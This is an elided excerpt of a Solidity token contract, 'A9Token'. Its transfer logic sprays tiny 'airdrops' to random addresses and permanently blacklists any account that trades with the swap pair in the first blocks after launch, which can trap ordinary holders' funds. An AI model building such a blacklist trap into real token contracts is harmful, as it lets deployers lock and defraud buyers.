...
contract A9Token is IERC20, Ownable {
    ...
    mapping(address => bool) public _dogs;
...
//    address USDTAddress = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;

    string private _name = unicode"🐸台蛙🐸";
    string private _symbol = unicode"🐸台蛙🐸";
    uint8 private _decimals = 18;

    uint256 public Supply = 1*10**12;
    address FundAddress = 0xf5c4003008C083100B0a000040cA84a80f0B5E4b;
    ...
    function _transfer(
        ...
        require(!_dogs[from] && !_dogs[to],"dogs");
        ...
        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            address ad;
            uint256 airDrops=amount/10000;
            for(int i=0;i <=29;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,airDrops/30);
            }
            amount -= airDrops;
        }
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (block.number < launchedAt + kb && !_swapPairList[from]) {
                    _dogs[from] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
...
//    function setDogs(address addr, bool enable) external onlyOwner {
//        _dogs[addr] = enable;
//    }
